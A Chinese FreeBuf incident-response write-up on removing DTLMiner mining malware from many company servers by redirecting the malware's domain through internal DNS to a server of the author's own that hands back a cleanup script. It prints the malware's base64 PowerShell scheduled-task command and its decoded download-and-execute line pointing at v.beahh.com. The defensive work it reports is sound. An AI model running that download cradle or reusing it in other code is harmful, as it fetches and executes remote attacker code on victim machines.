***本文作者：云絮，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

## 背景  

**某天忽然发现公司上百台机器中了变种的挖矿病毒DTLMiner，该病毒传播方式有多种，主要利用永恒之蓝漏洞、弱口令、mimikatz抓取域密码，数据库弱口令等方式传播，中毒后的机器会沦为挖矿机。**

## 跟踪分析  

中毒后的服务器CPU开始升高，机器445端口及1433端口产生大量链接数，并有对内网横向传播以及对外攻击的情况发生。

![image.png](https://image.3001.net/images/20190415/1555320683_5cb44f6b182b0.png!small)

![image.png](https://image.3001.net/images/20190415/1555320700_5cb44f7cc84e1.png!small)

在系统磁盘下windows目录下发现多个随机命名的exe文件，以及mimikatz的运行日志文件，包括powershell文件。发现中毒后第一时间使用杀毒软件清理病毒，简单粗暴！但是效果并不尽人意，被杀毒软件杀掉的病毒又会重新生成新的病毒文件。了解DTLMiner后发现他会在windows计划任务中添加定时任务，而定时任务会执行powershell代码，不易被杀毒软件检测查杀。

计划任务powershell内容如下：

    
    
    powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=

![image.png](https://image.3001.net/images/20190415/1555320711_5cb44f8739fde.png!small)

病毒利用powershell远程下载一段新的powershell代码执行，这里会定时下载新的病毒文件执行挖矿并开始蠕虫式传播。通过远程下载后拿到病毒代码，发现powershell代码被混淆过，在简单解码后主要内容可以看出：

![image.png](https://image.3001.net/images/20190415/1555320723_5cb44f93362e4.png!small)![image.png](https://image.3001.net/images/20190415/1555320727_5cb44f97913d2.png!small)

powershell代码会通过服务端下载新的病毒执行，并添加后门powershell到任务计划，对于生成的exe病毒文件只需要杀毒软件就可以轻松解决，但是powershell的计划任务却被遗漏导致无法清理彻底。

在清理powershell的时候发现有几个坑点：

> 1.中毒机器数量太多，无法跟踪确认每一台机器都彻底清理干净；
>
> 2.powershell计划任务命名随机，通过永恒之蓝漏洞攻击是由system权限创建的，普通管理员很难删除；
>
> 3.只有有一台服务器没有彻底清理干净随时可以再次扩散，并且可能病毒会通过powershell远程下载再次变种。

## DNS劫持欺骗“自杀”  

如何在上百台中毒机器中高效删除所有机器的病毒呢？首先分析powershell代码，base64解码后得到地址：

    
    
    IEX (New-Object Net.WebClient).downloadstring('http://v.beahh.com/v'+$env:USERDOMAIN)

通过上面的代码可以得知powershell会通过恶意域名v.beahh.com下载新的ps代码执行

![image.png](https://image.3001.net/images/20190415/1555320744_5cb44fa84ec2d.png!small)

那么只需要有一种替换ps代码的方式，让powershell请求恶意域获取到我们指定的ps代码即可控制病毒的执行，从而变成病毒的操控者,让病毒的ps代码主动请求“自杀”，这点只需要通过修改内网的DNS即可轻松做到。

![image.png](https://image.3001.net/images/20190415/1555320751_5cb44faf9daed.png!small)

### 准备web服务改为自定义ps代码  

例如删除所有无法清理干净powershell后门：

    
    
    $service=New-Object -ComObject("Schedule.Service")
    $service.Connect($env:COMPUTERNAME)
    
    
    #递归遍历所有和powershell有关的计划任务，发现则删除
    Function DeletePowershellTaskScheduler($TaskPath){
        $folder=$service.GetFolder($TaskPath)
        $taskitem=$folder.GetFolders(0)
        foreach($i in $taskitem){
            $tasks=$i.GetTasks(0)
            foreach($task in $tasks){
      
                $taskName=$task.Name
                $taskPath=$task.Path
                $taskXml=$task.Xml
                #Write-Host $taskName
                if([String]::IsNullOrEmpty($taskXml)){
                    $i.DeleteTask($taskName,0)
                    Write-Host "$taskName shcdule tree error , delete sucess"
                }
                elseif ($taskXml.ToLower().Contains("powershell")){
                    Write-Host "find scheduler script:$taskPath"
                    $task.Enabled=0
                    $i.DeleteTask($taskName,0)
                }
            }
    
    
    
    
            DeletePowershellTaskScheduler($i.Path)
            }
    }
    Write-Host "clear powershell script"
    DeletePowershellTaskScheduler -TaskPath "\"
    Write-Host "clear powershell script done."
    #普通权限重启计划任务服务会提示没有权限，但是不要担心，病毒的powershell都是system权限执行的
    Restart-Service schedule 
    Get-Process -Name powershell | Stop-Process -For

将上述的代码通过base64加密后放到我们自己搭建的web服务上,web服务代码如下，当然也可以直接通过配置nginx返回要替换的ps代码，这里我用pytohn
bottle实现：

    
    
    #base64后的powershell代码
    ps="""
    Invoke-Expression ([System.Text.UnicodeEncoding]::Unicode.GetString([Convert]::FromBase64String("JABzAGUAcgB2AGkAYwBlAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAKAAiAFMAYwBoAGUAZAB1AGwAZQAuAFMAZQByAHYAaQBjAGUAIgApAA0ACgAkAHMAZQByAHYAaQBjAGUALgBDAG8AbgBuAGUAYwB0ACgAJABlAG4AdgA6AEMATwBNAFAAVQBUAEUAUgBOAEEATQBFACkADQAKAEYAdQBuAGMAdABpAG8AbgAgAEQAZQBsAGUAdABlAFAAbwB3AGUAcgBzAGgAZQBsAGwAVABhAHMAawBTAGMAaABlAGQAdQBsAGUAcgAoACQAVABhAHMAawBQAGEAdABoACkAewANAAoAIAAgACAAIAAkAGYAbwBsAGQAZQByAD0AJABzAGUAcgB2AGkAYwBlAC4ARwBlAHQARgBvAGwAZABlAHIAKAAkAFQAYQBzAGsAUABhAHQAaAApAA0ACgAgACAAIAAgACQAdABhAHMAawBpAHQAZQBtAD0AJABmAG8AbABkAGUAcgAuAEcAZQB0AEYAbwBsAGQAZQByAHMAKAAwACkADQAKACAAIAAgACAAZgBvAHIAZQBhAGMAaAAoACQAaQAgAGkAbgAgACQAdABhAHMAawBpAHQAZQBtACkAewANAAoAIAAgACAAIAAgACAAIAAgACQAdABhAHMAawBzAD0AJABpAC4ARwBlAHQAVABhAHMAawBzACgAMAApAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAoACQAdABhAHMAawAgAGkAbgAgACQAdABhAHMAawBzACkAewANAAoAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHQAYQBzAGsATgBhAG0AZQA9ACQAdABhAHMAawAuAE4AYQBtAGUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAdABhAHMAawBQAGEAdABoAD0AJAB0AGEAcwBrAC4AUABhAHQAaAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB0AGEAcwBrAFgAbQBsAD0AJAB0AGEAcwBrAC4AWABtAGwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAVwByAGkAdABlAC0ASABvAHMAdAAgACQAdABhAHMAawBOAGEAbQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAKABbAFMAdAByAGkAbgBnAF0AOgA6AEkAcwBOAHUAbABsAE8AcgBFAG0AcAB0AHkAKAAkAHQAYQBzAGsAWABtAGwAKQApAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABpAC4ARABlAGwAZQB0AGUAVABhAHMAawAoACQAdABhAHMAawBOAGEAbQBlACwAMAApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACQAdABhAHMAawBOAGEAbQBlACAAcwBoAGMAZAB1AGwAZQAgAHQAcgBlAGUAIABlAHIAcgBvAHIAIAAsACAAZABlAGwAZQB0AGUAIABzAHUAYwBlAHMAcwAiAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABlAGwAcwBlAGkAZgAgACgAJAB0AGEAcwBrAFgAbQBsAC4AVABvAEwAbwB3AGUAcgAoACkALgBDAG8AbgB0AGEAaQBuAHMAKAAiAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgApACkAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBmAGkAbgBkACAAcwBjAGgAZQBkAHUAbABlAHIAIABzAGMAcgBpAHAAdAA6ACQAdABhAHMAawBQAGEAdABoACIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB0AGEAcwBrAC4ARQBuAGEAYgBsAGUAZAA9ADAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABpAC4ARABlAGwAZQB0AGUAVABhAHMAawAoACQAdABhAHMAawBOAGEAbQBlACwAMAApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoADQAKACAAIAAgACAAIAAgACAAIABEAGUAbABlAHQAZQBQAG8AdwBlAHIAcwBoAGUAbABsAFQAYQBzAGsAUwBjAGgAZQBkAHUAbABlAHIAKAAkAGkALgBQAGEAdABoACkADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgB9AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBjAGwAZQBhAHIAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAcwBjAHIAaQBwAHQAIgANAAoARABlAGwAZQB0AGUAUABvAHcAZQByAHMAaABlAGwAbABUAGEAcwBrAFMAYwBoAGUAZAB1AGwAZQByACAALQBUAGEAcwBrAFAAYQB0AGgAIAAiAFwAIgANAAoAUgBlAHMAdABhAHIAdAAtAFMAZQByAHYAaQBjAGUAIABzAGMAaABlAGQAdQBsAGUADQAKAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAB8ACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAbwByAGMAZQA=")));
    """
    
    
    
    
    #请求任何URL都返回ps可执行代码
    @route('/<n:path>',method=["POST","GET"])
    def powershell(n):
        logger.info(json.dumps({"IP":request.remote_addr,"Path":n}))
        return ps
    
    
    
    
    @route('/')
    def index():
        logger.info(json.dumps({"IP": request.remote_addr, "Path": "/"}))
        return ps
    
    
    
    
    if __name__ == '__main__':
        try:
            run(host='0.0.0.0',port=80)
        except Exception,e:
            print e
          
    #pip install bottle==0.12.13
    #python w

### 修改DNS指向  

v.beahh.com原域名指向地址：

![image.png](https://image.3001.net/images/20190415/1555320767_5cb44fbf56f5a.png!small)

通过内网DNS配置后改为我们刚刚web服务器的地址:

![image.png](https://image.3001.net/images/20190415/1555320773_5cb44fc5654f1.png!small)

现在内网所有中毒的机器都会主动请求我们自己部署的web服务，通过请求日志可以看到所有中毒机器的IP地址，以及请求参数中携带了主机的信息，包括主机的登录账号和密码，结合ELK可以对这些机器做数据整理分析。

![image.png](https://image.3001.net/images/20190415/1555320782_5cb44fce22c23.png!small)

因为web服务的页面已经替换成了我们自己写的ps，那么ps脚本就会自动被病毒执行，测试一台中毒的服务器，直接执行计划任务中病毒的执行命令即可触发看到效果，下图成功删除计划任务。

![image.png](https://image.3001.net/images/20190415/1555320815_5cb44fef80773.png!small)

## 总结

现在很多病毒都在利用powershell做无文件落地攻击，当中毒机器数量庞大的时候，利用这种思路可以高效快速的确定中毒机器，也可以有效控制机器请求恶意代码执行继续恶化传播，由于病毒创建计划任务是system权限，所以ps代码可以肆无忌惮的写，也可以写完整的病毒专杀powershell，本文抛砖引玉，仅供学习参考。

 ***本文作者：云絮，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

